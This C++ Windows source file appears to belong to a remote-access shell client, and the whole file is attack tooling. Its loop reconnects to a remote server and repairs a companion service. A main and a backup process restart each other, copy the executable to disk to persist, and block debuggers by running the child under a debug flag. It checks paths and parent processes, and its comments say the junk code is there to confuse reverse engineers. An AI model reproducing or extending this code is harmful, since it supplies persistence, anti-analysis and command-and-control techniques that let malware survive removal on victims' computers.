#include "general.h"
#include "serviceutils.h"
#include "utils.h"

#include <Windows.h>
#include <psapi.h>

//Used to enable prints since I couldn't debug with libzippp imports
#define _DEBUG 

#ifdef _DEBUG
#define Log(x) printf(x)
#else
#define Log(x) 
#endif

//Thread used to check if main shell is running, and if it not start it
void BackupThread();
//Thread used to check if backup shell is still running, and if not start it and close itself
void CheckBackupRunningThread();
void PauseExecution();
void PauseAndExit(int exitCode);
void CreateAndStartBackupOnDisk();

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//Alloc console for debug purposes
#ifdef _DEBUG
	AllocConsole();
	FILE* f;
	freopen_s(&f, "CONOUT$", "w", stdout);
#endif

	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { //Check that full path is at least one of the 2 valid ones, to mess with reverse engineers dumping this exe
		return 0;
	}

	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)BackupThread, NULL, NULL, NULL);

	//BEGINNING OF USELESS CODE

	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path == backup module path, do useless shit in main thread
		while (true) {
			char* uselessString = "GetNativeSystemInfo"; //Just to fuck with reverse engineers
useless_backup_shell_code:
			if (!IsDebuggerPresent()) { //I mean, why not
				HMODULE hUseless = GetModuleHandle(TEXT("kernel32.dll")); //Get random ass handle cuz people put hooks on this shit when debugging
				if (IsBadReadPtr(uselessString, 0)) { //This always returns 0 if second parameter is 0 so it will never jump (dont write if(false) since compiler will optimize and delete the branch
					goto non_backup_shell_code;
				}
			}
			//Some reverse engineers assume you will do process hijacking to svchost (it's common practice since svchost always exists and it's a common process so easy to "hide")
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess("svchost.exe"));
			//Now do some useless operation with this handle
			MEMORY_BASIC_INFORMATION mbi;
			if (VirtualQueryEx(hProc, (LPCVOID)uselessString, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) { //Do useless stuff on this data
				if (mbi.Protect)
					goto useless_backup_shell_code;
			}
		}
	}

	//END OF USELESS CODE
	//BEGINNING OF MAIN SHELL CODE (VARIOUS CHECKS)
non_backup_shell_code:
	Log("Got to main shell code\n");
	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { //Code repetition (using functions is counterproductive since they could hook them easily)
		return 0;
	}
	//Check that parent process == SHELL_BACKUP_NAME
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(Utils::getProcess(SHELL_NAME)));
	if (!hProcess)
		PauseAndExit(1);

	CHAR Buffer[MAX_PATH];
	if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
	{
		// At this point, buffer contains the full path to the executable
		if (strcmp(Buffer, SHELL_BACKUP_EXE)) {
			//They don't match
			Log("Parent process name doesn't match SHELL_BACKUP_EXE\n");
			CreateAndStartBackupOnDisk();
			PauseAndExit(1);
		}
		//They match so go on and do shit
	}
	else
	{
		PauseAndExit(1);
	}
	CloseHandle(hProcess);
	//END OF CHECKS

	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CheckBackupRunningThread, NULL, NULL, NULL);

	while (true)
	{
		if (!Client::main_client.connected)
		{
			Log("Client not connected, attempting to connect...\n");
			while (!Client::main_client.Connect())
			{
				Log("Failed to connect...\n");
				Sleep(5000);
			}
		}
		else {
			Log("Client connected!\n");
			//Here maybe check if the ShellManager service is still active, and if it isn't download it if necessary and start it up again
			Service::CheckAndRepairService();
		}

		Sleep(1000);
	}

	return 0;
}

void DebuggerThread() {
	Log("Started debugger thread\n");
	//Just ignore any debug events and continue execution
	DEBUG_EVENT debug_event = { 0 };
	for (;;)
	{
		if (!WaitForDebugEvent(&debug_event, INFINITE)) {
			Sleep(100);
			continue;
		}
		//Place your code to handle the event here:
		//
		//End
		ContinueDebugEvent(debug_event.dwProcessId,
			debug_event.dwThreadId,
			DBG_CONTINUE);
	}
}

void BackupThread() {
	//Check if this executable is the backup executable
	if (strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path != backup module path, do nothing
		return;
	}
	else { //Check if another backup shell is running
		if (Utils::getProcessCount(SHELL_BACKUP_NAME) > 1) { //If more than 1 backup shell is running exit process
			PauseAndExit(1);
		}
	}

	Log("Got into backup shell main thread\n");
	//Get an handle to the main shell
	HANDLE hProc = 0;
	auto procID = Utils::getProcess(SHELL_NAME);
	//If procID is 0 attempt to start the shell
	if (!procID) {
		Log("Couldn't get process ID\n");

		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		ZeroMemory(&info, sizeof(info));
		ZeroMemory(&processInfo, sizeof(processInfo));
		//Create process with debugging flag, since only one debugger can be attached to a process at a time
		while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &info, &processInfo))
		{
			Sleep(100);
		}
		CloseHandle(processInfo.hThread);
		hProc = processInfo.hProcess;
		//Start debugger thread to handle debug events (just skip through them)
		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)DebuggerThread, NULL, NULL, NULL);
	}
	else {
		Log("Got process ID successfully\n");
		//If main shell is already started check that the parent process path == SHELL_BACKUP_PATH
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(procID));
		if (!hProcess) {
			Log("Could not open an handle to the process");
			const auto hMainShell = OpenProcess(PROCESS_TERMINATE, false, procID);
			TerminateProcess(hMainShell, 1);
			CloseHandle(hMainShell);
		}
		else {
			CHAR Buffer[MAX_PATH];
			if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
			{
				// At this point, buffer contains the full path to the executable
				if (strcmp(Buffer, SHELL_BACKUP_EXE)) {
					//They don't match so kill main shell
					Log("Parent process of main shell process doesn't match SHELL_BACKUP_EXE");
					const auto hMainShell = OpenProcess(PROCESS_TERMINATE, false, procID);
					TerminateProcess(hMainShell, 1);
					CloseHandle(hMainShell);
				}
				//They match so go on and do shit
			}
			else
			{
				PauseAndExit(1);
			}
			CloseHandle(hProcess);
		}
	}
	if(!hProc)
		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

	//To store debug events
	DEBUG_EVENT debug_event = { 0 };

	while (true) {
		//Get exit code
		DWORD exitCode;
		while (!GetExitCodeProcess(hProc, &exitCode)) {
			Sleep(100);
		}

		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
		if (exitCode != STILL_ACTIVE) { //If process has stopped attempt to restart it
			CloseHandle(hProc);
			STARTUPINFO info = { sizeof(info) };
			PROCESS_INFORMATION processInfo;
			ZeroMemory(&info, sizeof(info));
			ZeroMemory(&processInfo, sizeof(processInfo));
			while (!CreateProcessA(SHELL_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
			{
				Sleep(100);
			}
			CloseHandle(processInfo.hThread);
			hProc = processInfo.hProcess;
		}
		Sleep(100);
	}
}

void CheckBackupRunningThread() {
	Log("Started backup shell check thread\n");
	while (true) {
		//Check if backup shell is still running
		auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
		if (!procID) {
			Log("Main shell has been closed\n");
			//If not running first attempt to copy the image to disk, then run it
			CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
			Log("Created backup shell on disk\n");

			STARTUPINFO info = { sizeof(info) };
			PROCESS_INFORMATION processInfo;
			ZeroMemory(&info, sizeof(info));
			ZeroMemory(&processInfo, sizeof(processInfo));
			while (!CreateProcessA(SHELL_BACKUP_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
			{
				Sleep(100);
			}
			CloseHandle(processInfo.hThread);
			CloseHandle(processInfo.hProcess);
			Log("Started backup shell\n");

			//After backup shell is started make sure to quit this executable
			PauseAndExit(1);
		}
		else {
			Sleep(100);
		}
	}
}

void CreateAndStartBackupOnDisk() {
	//Copy file on disk
	CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);

	//Execute SHELL_BACKUP
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&info, sizeof(info));
	ZeroMemory(&processInfo, sizeof(processInfo));
	while (!CreateProcessA(SHELL_BACKUP_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
	{
		Sleep(100);
	}
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);

	Log("Created backup shell process\n");
}

void PauseExecution() {
	MessageBoxA(NULL, "Paused", "Paused", MB_OK);
}

void PauseAndExit(int exitCode) {
#ifdef _DEBUG
	MessageBoxA(NULL, "Paused before exit", "Paused", MB_OK);
#endif
	ExitProcess(exitCode);
}